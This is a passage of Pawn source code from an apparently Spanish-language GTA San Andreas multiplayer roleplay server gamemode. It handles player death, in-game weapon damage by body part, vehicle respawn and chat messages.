    if(AdminDuty[playerid] == 0){SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);}
    if(AdminDuty[playerid] == 1){SetPlayerAttachedObject(playerid, 7, 18749, 1, 0.188027, 0.166383, 0.084972, 12.469782, 90.404510, 174.805938, 0.354661, 1.431730, 0.314013);}
    PonerUniformeFaccion(playerid);
    
    SetTimerEx("SpawnBug", 1000, false, "i", playerid);
    return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    Anims_OnPlayerDeath(playerid);
	new string[128];
	
	RemovePlayerColorFade(playerid); //Para seifader include
	
	GivePlayerMoneyAC(playerid, 100); //Le da los 100$ que pierde al morir
	
    reclutarfaccion[playerid] = 0; //Comando /reclutar
    reclutarlider[playerid] = 0;
    
    Esposado[playerid] = 0; //Esposas
    
    RemovePlayerAttachedObject(playerid, 4); //Esposas
    
    PizzaRepartida[playerid] = 0; //Job pizzero
    SolicitaPizza[playerid] = 0;
    
    CalleBarrida[playerid] = 0; //Job barrendero
    
    CajeroRepuesto[playerid] = 0; //Job securicar
    
    Cosechado[playerid] = 0; //Job cosechador
    
    Fumigado[playerid] = 0; //Job fumigador
    
    TaxiConductor[playerid] = NOEXISTE; //Job taxista
	TaxiPasajero[playerid] = NOEXISTE;
	TaxiCoste[playerid] = 0;
	SolicitaTaxi[playerid] = 0;
	
	for(new i=0; i<MAX_PLAYERS; i++) //Job taxista
    {
        if(TaxiConductor[i] == playerid){TaxiConductor[i] = NOEXISTE;}
        if(TaxiPasajero[i] == playerid){TaxiPasajero[i] = NOEXISTE;}
    }
    
    ReparacionTipo[playerid] = 0; //Job mecánico
	ReparacionMeca[playerid] = NOEXISTE;
	ReparacionPrecio[playerid] = 0;
	
	for(new i=0; i<MAX_PLAYERS; i++) //Job mecánico
    {
        if(ReparacionMeca[i] == playerid){ReparacionMeca[i] = NOEXISTE; ReparacionTipo[i] = 0; ReparacionPrecio[i] = 0;}
    }
    RepintadoColor1[playerid] = 0; //Job mecánico
    RepintadoColor2[playerid] = 0;
	RepintadoMeca[playerid] = NOEXISTE;
	RepintadoPrecio[playerid] = 0;
	
    for(new i=0; i<MAX_PLAYERS; i++) //Job mecánico
    {
        if(RepintadoMeca[i] == playerid){RepintadoMeca[i] = NOEXISTE; RepintadoColor1[i] = 0; RepintadoColor2[playerid] = 0; RepintadoPrecio[i] = 0;}
    }
    Contratador[playerid] = NOEXISTE;
	Contrato[playerid] = 0;
	
	for(new i=0; i<MAX_PLAYERS; i++) //Taller mecánico
    {
        if(Contratador[i] == playerid){Contratador[i] = NOEXISTE; Contrato[i] = 0;}
    }
    
    Robando[playerid] = 0;//Job ladrón
    KillTimer(RoboTimer[playerid]);
    Puenteando[playerid] = 0;
    KillTimer(PuenteTimer[playerid]);
    
    PescaRecogida[playerid] = 0; //Job pescador
    DineroPesca[playerid] = 0;
    
    MisionEncargada[playerid] = 0; //Sistema de misiones de pandillas
	RealizandoMision[playerid] = 0;
	MuroAPintar[playerid] = NOEXISTE;
	
	HaciendoPressBanca[playerid] = 0; //Comando /Entrenar
    RepeticionesPressBanca[playerid] = 0;
    
    PrestadorCoche[playerid] = NOEXISTE; // /PrestarLlave
    LlavePrestada[playerid] = NOEXISTE;
    
    EnLlamada[playerid] = 0; //Sistema teléfono
    ToqueLlamada[playerid] = 0;
   	KillTimer(ToqueLlamadaTimer[playerid]);
    if(PersonaEnLlamada[playerid] != NOEXISTE)KillTimer(ToqueLlamadaTimer[PersonaEnLlamada[playerid]]);
    if(EnLlamada[playerid] == 3)
	{
		KillTimer(CostoLlamadaTimer[playerid]);
		format(string, sizeof(string), "Coste de la llamada: %d$", CosteTotalLlamada[playerid]);
		SendClientMessage(playerid, RojoIntenso, string);
		PlayerInfo[playerid][pDineroBanco] -= CosteTotalLlamada[playerid];
		CosteTotalLlamada[playerid] = 0;
	}
	if(PersonaEnLlamada[playerid] != NOEXISTE)
	{
	    if(EnLlamada[PersonaEnLlamada[playerid]] == 3)
		{
			KillTimer(CostoLlamadaTimer[PersonaEnLlamada[playerid]]);
			format(string, sizeof(string), "Coste de la llamada: %d$", CosteTotalLlamada[PersonaEnLlamada[playerid]]);
			SendClientMessage(PersonaEnLlamada[playerid], RojoIntenso, string);
			PlayerInfo[PersonaEnLlamada[playerid]][pDineroBanco] -= CosteTotalLlamada[PersonaEnLlamada[playerid]];
			CosteTotalLlamada[PersonaEnLlamada[playerid]] = 0;
		}
	}
    if(PersonaEnLlamada[playerid] != NOEXISTE)SendClientMessage(playerid, Gris, "Se ha cortado la línea...");
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(PersonaEnLlamada[i] == playerid){SendClientMessage(i, Gris, "Se ha cortado la línea..."); EnLlamada[i] = 0; PersonaEnLlamada[i] = NOEXISTE; break;}
    }
    PersonaEnLlamada[playerid] = NOEXISTE;
    
    if(EnCatalogoVeh[playerid] != NOEXISTE) //catalogo
    {
        TextDrawHideForPlayer(playerid, fila1);
		TextDrawHideForPlayer(playerid, fila2);
		TextDrawHideForPlayer(playerid, fila3);
		TextDrawHideForPlayer(playerid, fila4);
	    TextDrawHideForPlayer(playerid, Modelo[EnCatalogoVeh[playerid]]); 
		TextDrawHideForPlayer(playerid, CocheNombre[EnCatalogoVeh[playerid]]);
		TextDrawHideForPlayer(playerid, Costo[EnCatalogoVeh[playerid]]);
		TextDrawHideForPlayer(playerid, Id[EnCatalogoVeh[playerid]]);
	    EnCatalogoVeh[playerid] = NOEXISTE;
    }

    for(new x=0; x<MAX_PLAYERS; x++) //Sistema RECON
    {
        if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][pSpecID] == playerid)
        AdvanceSpectate(x);
    }
    
    Yo[playerid] = 0; //Comando /yo
    DestroyDynamic3DTextLabel(Yo3DText[playerid]);
    
    CinturonPuesto[playerid] = 0; //Comando /Cinturón
    
    for(new x=0; x<5; x++) //Drogas
	{
	    PlayerInfo[playerid][pDrConsumida][x] = 0;
	}
	
	if(PlayerInfo[playerid][pEncarcelado] == 0) //Aviso muerte facciones publicas
    {
		new Float:pos[3];
		GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		GenerarInforme(playerid, pos[0], pos[1], pos[2]);
        for(new x=0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pServicioPD] > 0 && PlayerInfo[x][pFaccion] == 1 && x != playerid && GetPlayerVirtualWorld(playerid) == 0 && GetPlayerInterior(playerid) == 0)
            {
                SendClientMessage(x, AguamarinaOscuro, "[Radio] Central: Se ha reportado la localización de un herido de gravedad.");
                format(string, sizeof(string), "[Radio] Central: Se le reconoce como %s, que una unidad vaya a socorrerlo.", GetPlayerNameRP(playerid));
                SendClientMessage(x, AguamarinaOscuro, string);
                SetPlayerCheckpoint(x, pos[0], pos[1], pos[2], 2.0);
            }
        }
    }
    
    if(PlayerInfo[playerid][pEncarcelado] == 1) //Prisión LSPD
    {
        for(new x=0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pServicioPD] > 0 && PlayerInfo[x][pFaccion] == 1)
            {
                SendClientMessage(x, AguamarinaOscuro, "[Radio] Central: Se está reportando violencia en las celdas de comisaría.");
                format(string, sizeof(string), "[Radio] Central: El preso {FF0000}%s {02b1af}ha sufrido daños graves.", GetPlayerNameRP(playerid));
                SendClientMessage(x, AguamarinaOscuro, string);
            }
        }
    }
    if(PlayerInfo[playerid][pEncarcelado] == 2) //Prisión federal
    {
        for(new x=0; x<MAX_PLAYERS; x++)
        {
            if(PlayerInfo[x][pServicioPD] > 0 && PlayerInfo[x][pFaccion] == 1)
            {
                SendClientMessage(x, AguamarinaOscuro, "[Radio] Central: Se está reportando violencia en la prisión federal.");
                format(string, sizeof(string), "[Radio] Central: El preso {FF0000}%s {02b1af}ha sufrido daños graves.", GetPlayerNameRP(playerid));
                SendClientMessage(x, AguamarinaOscuro, string);
            }
        }
    }
    
    if(PlayerInfo[playerid][pMuerto] > 0) //Sistema muerte
    {
	    KillTimer(MuertoTimer[playerid]);
		KillTimer(MuertoFlashTimer[playerid]);
    }
    
    if(PlayerInfo[playerid][pMuerto] == 0 /*&& AdminDuty[playerid] == 0*/) //Sistema de muerte
	{
	    GetPlayerPos(playerid, MuertoX[playerid], MuertoY[playerid], MuertoZ[playerid]);
	    MuertoInt[playerid] = GetPlayerInterior(playerid), MuertoVW[playerid] = GetPlayerVirtualWorld(playerid);
	    if(GetDistance(MuertoX[playerid], MuertoY[playerid], MuertoZ[playerid], 1182.8728, -1323.5931, 13.5783) < GetDistance(MuertoX[playerid], MuertoY[playerid], MuertoZ[playerid], 2002.5728, -1445.3669, 13.5616))
	    {
	    	PlayerInfo[playerid][pMuerto] = 1;
	    }
	    else
		{
			PlayerInfo[playerid][pMuerto] = 2;
		}
		if(GetPlayerVehicleID(playerid) == 0)
		{
			if(PlayerInfo[playerid][pManoDer] > 0)
			{
				DropObjeto(PlayerInfo[playerid][pManoDer], PlayerInfo[playerid][pManoDerCant], MuertoX[playerid], MuertoY[playerid]-0.3, MuertoZ[playerid], MuertoVW[playerid], MuertoInt[playerid]);
				PlayerInfo[playerid][pManoDer] = 0, PlayerInfo[playerid][pManoDerCant] = 0, RemovePlayerAttachedObject(playerid, 1);
			}
			if(PlayerInfo[playerid][pManoIzq] > 0)
			{
				DropObjeto(PlayerInfo[playerid][pManoIzq], PlayerInfo[playerid][pManoIzqCant], MuertoX[playerid], MuertoY[playerid]+0.3, MuertoZ[playerid], MuertoVW[playerid], MuertoInt[playerid]);
				PlayerInfo[playerid][pManoIzq] = 0, PlayerInfo[playerid][pManoIzqCant] = 0, RemovePlayerAttachedObject(playerid, 2);
			}
			if(PlayerInfo[playerid][pEspalda] > 0)
			{
				DropObjeto(PlayerInfo[playerid][pEspalda], PlayerInfo[playerid][pEspaldaCant], MuertoX[playerid], MuertoY[playerid], MuertoZ[playerid], MuertoVW[playerid], MuertoInt[playerid]);
				PlayerInfo[playerid][pEspalda] = 0, PlayerInfo[playerid][pEspaldaCant] = 0, RemovePlayerAttachedObject(playerid, 3);
			}
		}
	}
	Streamer_Update(playerid);
    return 1;
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(weaponid >= 22 && weaponid <= 34 && weaponid != 23) //Armas de fuego exceptuando la silenciada
	{
	    new string[128];
	    if(TimerSonidoDisparo[playerid] != 1) //Sonidos realistas
	    {
    	    switch(weaponid)
    	    {
    	        case 22: format(string, sizeof(string), "* Oyes disparos de una pistola.", GetPlayerNameRP(playerid)),
     	        ProxDetector(105.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 24: format(string, sizeof(string), "* Oyes disparos de una pistola de gran calibre.", GetPlayerNameRP(playerid)),
     	        ProxDetector(105.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 25: format(string, sizeof(string), "* Oyes disparos de una escopeta.", GetPlayerNameRP(playerid)),
     	        ProxDetector(120.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 26: format(string, sizeof(string), "* Oyes disparos de una escopeta pequeña.", GetPlayerNameRP(playerid)),
     	        ProxDetector(105.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 27: format(string, sizeof(string), "* Oyes disparos de una escopeta automática.", GetPlayerNameRP(playerid)),
     	        ProxDetector(120.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 28: format(string, sizeof(string), "* Oyes disparos de un micro subfusil.", GetPlayerNameRP(playerid)),
     	        ProxDetector(105.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 29: format(string, sizeof(string), "* Oyes disparos de un subfusil.", GetPlayerNameRP(playerid)),
     	        ProxDetector(135.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 30: format(string, sizeof(string), "* Oyes disparos de un fusil de asalto.", GetPlayerNameRP(playerid)),
     	        ProxDetector(150.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 31: format(string, sizeof(string), "* Oyes disparos de un fusil de asalto.", GetPlayerNameRP(playerid)),
     	        ProxDetector(150.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 32: format(string, sizeof(string), "* Oyes disparos de un micro subfusil.", GetPlayerNameRP(playerid)),
     	        ProxDetector(105.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 33: format(string, sizeof(string), "* Oyes disparos de un rifle.", GetPlayerNameRP(playerid)),
     	        ProxDetector(180.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	        case 34: format(string, sizeof(string), "* Oyes disparos de un rifle.", GetPlayerNameRP(playerid)),
     	        ProxDetector(180.0, playerid, string,NaranjaOscuro,NaranjaOscuro,Naranja,Naranja,AmarilloClaro);
     	    }
     	    TimerSonidoDisparo[playerid] = 1;
     	    SetTimerEx("TSonidoDisparo",5000,0,"d",playerid);
 	    }
	}
	if(PlayerInfo[playerid][pManoDer] == 38 && weaponid == 23){TaserRecarga[playerid] = 1; SetTimerEx("RecargarTaser", 5000, false, "i", playerid);} //Sistema de recarga de taser
    return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart)
{
return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
	if(!IsPlayerConnected(playerid)){return 1;}
	if(AdminDuty[playerid] == 1){return 1;}
	if(PlayerInfo[playerid][pMuerto] != 0){return 1;}
	if(GetPlayerState(playerid) == PLAYER_STATE_WASTED){return 1;}
    if(weaponid == 54) //Caida
    {
    	GivePlayerHealth(playerid, -(amount*2.5));
    }
    if(issuerid != INVALID_PLAYER_ID)
    {
        if(weaponid == 23 && PlayerInfo[issuerid][pManoDer] == 38) //Mensaje de daño por táser
        {
			new string[128];
        	format(string, sizeof(string), "* %s dispara a %s (Pistola táser)", GetPlayerNameRP(issuerid), GetPlayerNameRP(playerid));
            SendClientMessage(playerid, RojoIntenso, string);
        	format(string, sizeof(string), "* %s dispara a %s (Pistola táser)", GetPlayerNameRP(issuerid), GetPlayerNameRP(playerid));
            SendClientMessage(issuerid, Verde, string);
        }
        else if(!((weaponid >= 0) && (weaponid <= 18)) && !((weaponid > 34) && (weaponid <= 201))) //Mensaje de daño por arma
        {
            new weaponname[34], string[128], zona[20];
            switch(bodypart)
            {
                case 3: zona = "el torso";
                case 4: zona = "la entrepierna";
                case 5: zona = "el brazo izquierdo";
                case 6: zona = "el brazo derecho";
                case 7: zona = "la pierna izquierda";
                case 8: zona = "la pierna derecha";
                case 9: zona = "la cabeza";
            }
            GetWeaponNameEx(weaponid,weaponname,sizeof(weaponname));
        	format(string, sizeof(string), "* %s disparó a %s (%s) en %s.", GetPlayerNameRP(issuerid), GetPlayerNameRP(playerid), weaponname, zona);
            SendClientMessage(playerid, RojoIntenso, string);
        	format(string, sizeof(string), "* %s disparó a %s (%s) en %s.", GetPlayerNameRP(issuerid), GetPlayerNameRP(playerid), weaponname, zona);
            SendClientMessage(issuerid, Verde, string);
        }
        new Float:chaleco, Float:Dano;
        if(weaponid == 0) //Puños
        {
        	GivePlayerHealth(playerid, -amount*(float(PlayerInfo[issuerid][pFuerza]))/100);
        }
        if(weaponid == 34) //Francotirador
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*40;
                case 4: Dano = 2*40;
                case 5: Dano = 1*40;
                case 6: Dano = 1*40;
                case 7: Dano = 1*40;
                case 8: Dano = 1*40;
                case 9: Dano = 3*40;
            }
            if(bodypart == 9){SetPlayerHealth(playerid, 0.0);}
            else if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
                GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
            {
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 8)  //Katana
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 30 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -30.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -30.0);
            }
        }
        if(weaponid == 22) //M1911
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*12;
                case 4: Dano = 2*12;
                case 5: Dano = 1*12;
                case 6: Dano = 1*12;
                case 7: Dano = 1*12;
                case 8: Dano = 1*12;
                case 9: Dano = 3*12;
            }
           	if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 23 && PlayerInfo[issuerid][pManoDer] != 38) //M1911 con silenciador
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*12;
                case 4: Dano = 2*12;
                case 5: Dano = 1*12;
                case 6: Dano = 1*12;
                case 7: Dano = 1*12;
                case 8: Dano = 1*12;
                case 9: Dano = 3*12;
            }
           	if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 23 && PlayerInfo[issuerid][pManoDer] == 38 && !IsPlayerInAnyVehicle(playerid)) //Táser
        {
			if(IsPlayerInAnyVehicle(playerid)){return 1;}
	        new string[128];
            TogglePlayerControllable(playerid, 0);
			Taseado[playerid] = 1;
			SetTimerEx("Destasear", 20000, false, "i", playerid);
            PlayerPlaySound(playerid, 6003, 0.0, 0.0, 0.0);
            PlayerPlaySound(issuerid, 6003, 0.0, 0.0, 0.0);
            format(string, sizeof(string), "* Has sido taseado por %s", GetPlayerNameRP(issuerid));
            SendClientMessage(playerid, AzulClaro, string);
			format(string, sizeof(string), "* Has taseado a %s", GetPlayerNameRP(playerid));
			SendClientMessage(issuerid, AzulClaro, string);
        }
        if(weaponid == 24) //D. Eagle
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*40;
                case 4: Dano = 2*40;
                case 5: Dano = 1*40;
                case 6: Dano = 1*40;
                case 7: Dano = 1*40;
                case 8: Dano = 1*40;
                case 9: Dano = 3*40;
            }
            if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
                GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 28) //UZI
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*12;
                case 4: Dano = 2*12;
                case 5: Dano = 1*12;
                case 6: Dano = 1*12;
                case 7: Dano = 1*12;
                case 8: Dano = 1*12;
                case 9: Dano = 3*12;
            }
           	if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 32) //Tec-9
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*10;
                case 4: Dano = 2*10;
                case 5: Dano = 1*10;
                case 6: Dano = 1*10;
                case 7: Dano = 1*10;
                case 8: Dano = 1*10;
                case 9: Dano = 3*10;
            }
       	    if(chaleco <= Dano && chaleco > 0)
       	    {
       	        SetPlayerArmour(playerid, 0.0);
       	    }
       	    else if(chaleco > 0)
       	    {
		        GivePlayerArmour(playerid, -Dano);
       	    }
            else if(chaleco <= 0)
		    {
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 29) //MP5
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*14;
                case 4: Dano = 2*14;
                case 5: Dano = 1*14;
                case 6: Dano = 1*14;
                case 7: Dano = 1*14;
                case 8: Dano = 1*14;
                case 9: Dano = 3*14;
            }
       	    if(chaleco <= Dano && chaleco > 0)
       	    {
       	        SetPlayerArmour(playerid, 0.0);
       	    }
       	    else if(chaleco > 0)
       	    {
		        GivePlayerArmour(playerid, -Dano);
       	    }
            else if(chaleco <= 0)
		    {
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 30) //Ak-47
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*24;
                case 4: Dano = 2*24;
                case 5: Dano = 1*24;
                case 6: Dano = 1*24;
                case 7: Dano = 1*24;
                case 8: Dano = 1*24;
                case 9: Dano = 3*24;
            }
       	    if(chaleco <= Dano && chaleco > 0)
       	    {
       	        SetPlayerArmour(playerid, 0.0);
           	}
       	    else if(chaleco > 0)
       	    {
		        GivePlayerArmour(playerid, -Dano);
       	    }
            else if(chaleco <= 0)
		    {
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 31) //M4
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*21;
                case 4: Dano = 2*21;
                case 5: Dano = 1*21;
                case 6: Dano = 1*21;
                case 7: Dano = 1*21;
                case 8: Dano = 1*21;
                case 9: Dano = 3*21;
            }
       	    if(chaleco <= Dano && chaleco > 0)
       	    {
       	        SetPlayerArmour(playerid, 0.0);
       	    }
       	    else if(chaleco > 0)
       	    {
		        GivePlayerArmour(playerid, -Dano);
       	    }
            else if(chaleco <= 0)
		    {
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 25) //Escopeta
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 3*amount;
                case 4: Dano = 3*amount;
                case 5: Dano = 2*amount;
                case 6: Dano = 2*amount;
                case 7: Dano = 2*amount;
                case 8: Dano = 2*amount;
                case 9: Dano = 4*amount;
            }
           	if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 26) //Escopeta recortada
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 3*amount;
                case 4: Dano = 3*amount;
                case 5: Dano = 2*amount;
                case 6: Dano = 2*amount;
                case 7: Dano = 2*amount;
                case 8: Dano = 2*amount;
                case 9: Dano = 4*amount;
            }
           	if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 27) //Escopeta automatica
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 3*amount;
                case 4: Dano = 3*amount;
                case 5: Dano = 2*amount;
                case 6: Dano = 2*amount;
                case 7: Dano = 2*amount;
                case 8: Dano = 2*amount;
                case 9: Dano = 4*amount;
            }
           	if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 33) //Rifle de caza
        {
            GetPlayerArmour(playerid, chaleco);
            switch(bodypart)
            {
                case 3: Dano = 2*40;
                case 4: Dano = 2*40;
                case 5: Dano = 1*40;
                case 6: Dano = 1*40;
                case 7: Dano = 1*40;
                case 8: Dano = 1*40;
                case 9: Dano = 3*40;
            }
            if(bodypart == 9){SetPlayerHealth(playerid, 0.0);}
           	else if(chaleco <= Dano && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -Dano);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -Dano);
            }
        }
        if(weaponid == 5) //Bate
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 15 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -13.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -13.0);
            }
        }
        if(weaponid == 1) //Puño americano
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 10 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -10.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -10.0);
            }
        }
        if(weaponid == 2) //Palo de golf
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 15 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -15.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -15.0);
            }
        }
        if(weaponid == 3) //Porra
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 17 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -17.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -17.0);
            }
        }
        if(weaponid == 4) //Cuchillo
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 19 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -19.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -19.0);
            }
        }
        if(weaponid == 6) //Pala
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 15 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
            }
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -15.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -15.0);
            }
        }
        if(weaponid == 7) //Palo de billar
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 13 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -13.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -13.0);
            }
        }
        if(weaponid == 15) //Palanca
        {
            GetPlayerArmour(playerid, chaleco);
           	if(chaleco <= 18 && chaleco > 0)
           	{
               	SetPlayerArmour(playerid, 0.0);
           	}
           	else if(chaleco > 0)
           	{
        		GivePlayerArmour(playerid, -13.0);
           	}
            else if(chaleco <= 0)
    		{
                GivePlayerHealth(playerid, -13.0);
            }
        }
    }
    return 1;
}

public OnVehicleSpawn(vehicleid)
{
	if(vehicleid > MAX_VEHPUBLICO) //Vehículo de compra
	{
	    if(VehExplotado[vehicleid] == 1) //Si ha explotado
	    {
	        SetVehicleVirtualWorld(vehicleid, vehicleid+1);
	        VehExplotado[vehicleid] = 0;
	        if(IsABoat(vehicleid)){SetVehiclePos(vehicleid, 2294.3999,-2447.8005,0.0000);}
	        else{SetVehiclePos(vehicleid, 2274.1028,-2345.5371,13.5469);}
	    }
	}
	DestroyDynamicObject(SirenaCoche[vehicleid]);
    return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
    if(vehicleid > MAX_VEHPUBLICO) //Vehículo de compra
	{
	    if(CarInfo[vehicleid][cEnDeposito] == 0) //No está en depósito
	    {
	    	if(!IsAPlane(vehicleid)){VehExplotado[vehicleid] = 1; CarInfo[vehicleid][cEnDeposito] = 1;}
	    }
    }
	return 1;
}

public OnPlayerText(playerid, text[])
{
    new Nombre[MAX_PLAYER_NAME];
	new string[128];
    
    EstaAFK[playerid] = 0; //Anti AFK
	format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
    printf("%s dice: %s", Nombre, text); //Se guarda en el chatlog
    if(CocheLSN(GetPlayerVehicleID(playerid)) && DirectoLSNCoche[GetPlayerVehicleID(playerid)] != NOEXISTE)
    {
        format(string, sizeof(string), "[Directo] %s: %s", Nombre, text);
        NoticiasLSN(AmarilloClaro, string);
        return 0;
    }
    if(EnLlamada[playerid] == 444) //Anuncios
    {
        new string2[250];
        anunciotiempo = 1200;
        PlayerInfo[playerid][pDineroBanco] -= 300;
        SendClientMessage(playerid, Amarillo, "LSRTV: Bien, el anuncio costará 300$. Lo publicaremos en breves.");
		format(string2, sizeof(string2), "Anuncio: %s, Tlf: %d", text, PlayerInfo[playerid][pTelefono]);
        SendClientMessageToAll(Verde, string2);
        format(string, sizeof(string), "Anunaciado enviado por '%s' [ID: %d]", GetPlayerNameRP(playerid), playerid);
        SendAdminMessage(Aguamarina, string);
